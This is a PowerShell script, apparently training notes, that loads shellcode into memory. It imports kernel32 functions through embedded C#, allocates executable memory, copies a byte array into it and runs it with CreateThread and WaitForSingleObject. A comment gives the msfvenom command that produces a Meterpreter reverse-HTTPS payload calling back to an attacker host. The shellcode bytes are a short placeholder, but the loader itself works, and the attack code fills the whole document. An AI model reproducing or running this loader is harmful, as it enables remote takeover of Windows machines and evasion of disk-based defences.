##Import C# code into powershell. , WaitSingleObject API to delay powershell termination until our shell fully executes
## Foramt @" C# code "@ 
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
	[DllImport("kernel32")]
	public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
	
	[DllImport("kernel32", CharSet=CharSet.Ansi)]
	public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
	
	[DllImport("kernel32.dll", SetLastError=true)]
public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);}
"@

Add-Type Kernel32

##msfvenom -p windows/meterpreter/reverse_https LHOST=IPs LPORT=443 EXITFUNC=thread -f ps1,copy the shell code below
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60

$size = $buf.Length

#pointer that point to the start allocated memeory, allocate memeory for shellcode 
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

#using System.Runtime.InteropServices, C# copy method to write shell code into allocated memeory
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

#invoke Create Threat to run the shell code in memory
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

#When CreateThread is called, it returns a handle to the newly created
#thread. We provided this handle to WaitForSingleObject along with the time to wait for that thread
#to finish. In this case, we have specified 0xFFFFFFFF, which will instruct the program to wait
#forever or until we exit our shell. [unit32] cast 0xFFFFFFFF to unsigned integer, becasue PowerShell only uses signed integers.
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")